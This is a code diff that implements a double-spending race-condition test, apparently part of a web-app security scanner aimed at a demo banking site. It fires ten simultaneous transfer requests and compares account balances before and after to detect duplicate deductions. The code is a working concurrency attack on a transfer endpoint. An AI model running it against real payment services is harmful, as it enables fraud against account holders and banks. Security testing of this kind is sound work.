@@ -4,24 +4,57 @@ class DoubleSpending():
         self.client = client
         self.auth = auth
         self.results = []
+        self.lock = threading.Lock()
     def send_transfer(self, sender, receiver, amount):
-        pass
+        response = self.client.post("/bank/doTransfer", data={
+            "fromAccount": sender,
+            "toAccount": receiver,
+            "transferAmount": amount,
+            "transfer": "Transfer Money"
+        })
+        with self.lock:
+            if response.status_code == 200:
+                self.results.append("SUCCESS")
+            else:
+                self.results.append("FAIL")
 
-    def run(self):
-        print("Starting Double Spending detection...")
-        t1 = threading.Thread(target=self.send_transfer)
-        t2 = threading.Thread(target=self.send_transfer)
+    def run(self, sender="800002", receiver="800003", amount="100", threads=10):
+        print(f"Starting Double Spending detection with {threads} concurrent threads...")
+        self.results = []
 
-        t1.start()
-        t2.start()
-        t1.join()
-        t2.join()
+        balance_before = self.auth.get_balance()
+        before = float(balance_before.replace("$", "").replace(",", "").strip())
 
+        # Fire many transfers simultaneously
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=self.send_transfer, args=(sender, receiver, amount))
+            thread_list.append(t)
 
+        for t in thread_list:
+            t.start()
+        for t in thread_list:
+            t.join()
 
-# 1. login
-# 2. get balance before
-# 3. send transfer
-# 4. send same transfer again
-# 5. get balance after
-# 6. compare and report
+        balance_after = self.auth.get_balance()
+        after = float(balance_after.replace("$", "").replace(",", "").strip())
+
+        delta = round(before - after, 2)
+        expected = float(amount)
+        successes = self.results.count("SUCCESS")
+
+        print(f"\n[DOUBLE SPENDING] Analysis:")
+        print(f"Threads fired       : {threads}")
+        print(f"Requests succeeded  : {successes}/{threads}")
+        print(f"Balance before      : {balance_before}")
+        print(f"Balance after       : {balance_after}")
+        print(f"Amount per transfer : ${amount}")
+        print(f"Expected deduction  : ${expected} (1 transfer)")
+        print(f"Actual deduction    : ${delta}")
+
+        if delta > expected:
+            times = round(delta / expected)
+            print(f"\nVULNERABILITY DETECTED - Balance dropped {times}x the transfer amount!")
+            print(f"Server processed {times} out of {threads} concurrent transfers.")
+        else:
+            print(f"\nSAFE - Balance only dropped once despite {threads} concurrent requests.")
